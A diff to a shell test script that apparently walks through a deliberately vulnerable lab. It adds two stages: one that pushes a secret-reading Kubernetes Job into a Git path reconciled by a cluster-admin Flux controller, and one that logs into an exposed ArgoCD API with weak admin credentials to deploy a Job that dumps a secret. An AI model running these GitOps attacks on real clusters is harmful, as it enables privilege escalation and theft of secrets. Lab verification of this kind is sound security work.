@@ -169,6 +169,107 @@ EOF
   chk k8s_2 k8s_2-rbac-escalation "$out"
 fi
 
+# --- k8s_3: Flux kustomize-controller (cluster-admin) reconciles attacker-writable Git path ----
+if enabled k8s_3; then
+  W=$(mktemp -d)
+  git clone -q "http://$AU:$AP@gitea:3000/alpha/infra.git" "$W/infra" 2>/dev/null
+  mkdir -p "$W/infra/fleet"
+  cat > "$W/infra/fleet/kustomization.yaml" <<'YML'
+apiVersion: kustomize.config.k8s.io/v1beta1
+kind: Kustomization
+resources: [exfil.yaml]
+YML
+  cat > "$W/infra/fleet/exfil.yaml" <<'YML'
+apiVersion: batch/v1
+kind: Job
+metadata: { name: flux-exfil, namespace: platform }
+spec:
+  backoffLimit: 0
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+      - name: x
+        image: busybox:1.36
+        command: ["sh","-c","echo FOUND=$CROWN"]
+        env:
+        - name: CROWN
+          valueFrom: { secretKeyRef: { name: flux-crown, key: flag } }
+YML
+  ( cd "$W/infra" && git -c user.email=atk@x -c user.name=atk add -A \
+    && { git -c user.email=atk@x -c user.name=atk commit -q -m "fleet manifests" || true; } \
+    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
+  rm -rf "$W"
+  out=$(rsx k8s root <<'EOF'
+export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
+k3s kubectl -n platform delete job flux-exfil --ignore-not-found >/dev/null 2>&1
+TS=$(date +%s)
+k3s kubectl -n flux-system annotate gitrepository fleet reconcile.fluxcd.io/requestedAt="$TS" --overwrite >/dev/null 2>&1
+k3s kubectl -n flux-system annotate kustomization fleet reconcile.fluxcd.io/requestedAt="$TS" --overwrite >/dev/null 2>&1
+for i in $(seq 1 50); do k3s kubectl -n platform get job flux-exfil >/dev/null 2>&1 && break; sleep 3; done
+for i in $(seq 1 25); do
+  p=$(k3s kubectl -n platform get pods -l job-name=flux-exfil -o name 2>/dev/null | head -1)
+  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break; sleep 3
+done
+p=$(k3s kubectl -n platform get pods -l job-name=flux-exfil -o name 2>/dev/null | head -1)
+[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
+EOF
+)
+  chk k8s_3 k8s_3-flux-controller-rce "$out"
+fi
+
+# --- k8s_4: exposed ArgoCD API + weak admin -> create+sync an app into a restricted namespace ----
+if enabled k8s_4; then
+  W=$(mktemp -d)
+  git clone -q "http://$AU:$AP@gitea:3000/alpha/app.git" "$W/app" 2>/dev/null
+  mkdir -p "$W/app/k4"
+  cat > "$W/app/k4/job.yaml" <<'YML'
+apiVersion: batch/v1
+kind: Job
+metadata: { name: k4-exfil, namespace: platform }
+spec:
+  backoffLimit: 0
+  template:
+    spec:
+      restartPolicy: Never
+      containers:
+      - name: x
+        image: busybox:1.36
+        command: ["sh","-c","echo FOUND=$CROWN"]
+        env:
+        - name: CROWN
+          valueFrom: { secretKeyRef: { name: crown4, key: flag } }
+YML
+  ( cd "$W/app" && git -c user.email=atk@x -c user.name=atk add -A \
+    && { git -c user.email=atk@x -c user.name=atk commit -q -m "k4 manifests" || true; } \
+    && git -c user.email=atk@x -c user.name=atk push -q origin main ) 2>/dev/null
+  rm -rf "$W"
+  out=$(rsx k8s root <<'EOF'
+export KUBECONFIG=/etc/rancher/k3s/k3s.yaml
+GIP=$(getent hosts gitea | awk '{print $1}' | head -1)
+A=https://127.0.0.1:30443
+TOK=$(curl -sk $A/api/v1/session -H 'Content-Type: application/json' -d '{"username":"admin","password":"admin123"}' | sed -n 's/.*"token":"\([^"]*\)".*/\1/p')
+[ -z "$TOK" ] && { echo LOGIN-FAILED; exit 0; }
+k3s kubectl -n platform delete job k4-exfil --ignore-not-found >/dev/null 2>&1
+cat > /tmp/k4app.json <<JSON
+{"metadata":{"name":"k4pwn"},"spec":{"project":"default","source":{"repoURL":"http://$GIP:3000/alpha/app.git","targetRevision":"main","path":"k4"},"destination":{"server":"https://kubernetes.default.svc","namespace":"platform"},"syncPolicy":{"automated":{}}}}
+JSON
+curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' $A/api/v1/applications -d @/tmp/k4app.json >/dev/null 2>&1
+sleep 2
+curl -sk -H "Authorization: Bearer $TOK" -H 'Content-Type: application/json' "$A/api/v1/applications/k4pwn/sync" -d '{}' >/dev/null 2>&1
+for i in $(seq 1 40); do k3s kubectl -n platform get job k4-exfil >/dev/null 2>&1 && break; sleep 3; done
+for i in $(seq 1 20); do
+  p=$(k3s kubectl -n platform get pods -l job-name=k4-exfil -o name 2>/dev/null | head -1)
+  [ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null | grep -q FOUND= && break; sleep 3
+done
+p=$(k3s kubectl -n platform get pods -l job-name=k4-exfil -o name 2>/dev/null | head -1)
+[ -n "$p" ] && k3s kubectl -n platform logs "$p" 2>/dev/null
+rm -f /tmp/k4app.json
+EOF
+)
+  chk k8s_4 k8s_4-argocd-weak-admin "$out"
+fi
+
 echo
 printf '### playthrough: %d passed, %d failed ###\n' "$PASS" "$FAIL"
 [ "$FAIL" -gt 0 ] && echo "FAILED: ${FAILED[*]}"
